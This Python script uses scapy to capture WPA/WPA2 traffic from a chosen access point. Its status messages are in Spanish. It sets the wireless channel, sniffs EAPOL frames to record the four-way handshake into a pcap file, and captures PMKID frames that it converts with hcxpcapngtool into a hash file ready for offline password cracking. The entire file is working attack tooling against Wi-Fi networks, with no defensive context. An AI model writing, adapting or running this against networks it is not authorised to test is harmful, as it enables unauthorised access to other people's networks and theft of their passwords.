from scapy.all import sniff, wrpcap, Dot11, EAPOL
import subprocess
import os


def set_channel(interface, channel):
    subprocess.run(['iw', 'dev', interface, 'set', 'channel', str(channel)],
                   capture_output=True)


def capture_handshake(interface, bssid, channel, timeout=60,
                      output='handshake.pcap'):
    set_channel(interface, channel)
    packets = []
    state = {'n': 0}

    def handler(pkt):
        if pkt.haslayer(EAPOL) and (pkt[Dot11].addr3 == bssid
                                    or pkt[Dot11].addr1 == bssid):
            packets.append(pkt)
            state['n'] += 1
            print(f"[+] EAPOL capturado ({state['n']}/4)")

    print(f"[*] Capturando handshake en {bssid} (canal {channel})...")
    sniff(iface=interface, prn=handler, timeout=timeout, store=0,
          stop_filter=lambda p: state['n'] >= 4)

    if packets:
        wrpcap(output, packets)
        print(f"[+] Handshake guardado en {output}")
        return output
    print("[-] No se capturó ningún handshake.")
    return None


def capture_pmkid(interface, bssid, channel, timeout=60, output='pmkid.pcap'):
    set_channel(interface, channel)
    packets = []

    def handler(pkt):
        if pkt.haslayer(EAPOL) and pkt[Dot11].addr3 == bssid:
            packets.append(pkt)

    print(f"[*] Capturando PMKID en {bssid} (canal {channel})...")
    sniff(iface=interface, prn=handler, timeout=timeout, store=0)

    if not packets:
        print("[-] No se capturó PMKID.")
        return None

    wrpcap(output, packets)
    hash_file = output.replace('.pcap', '.16800')
    subprocess.run(['hcxpcapngtool', '-o', hash_file, output],
                   capture_output=True)
    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        print(f"[+] Hash PMKID extraído: {hash_file}")
        return hash_file
    print(f"[!] Capturado en {output} pero no se pudo extraer el hash.")
    return output
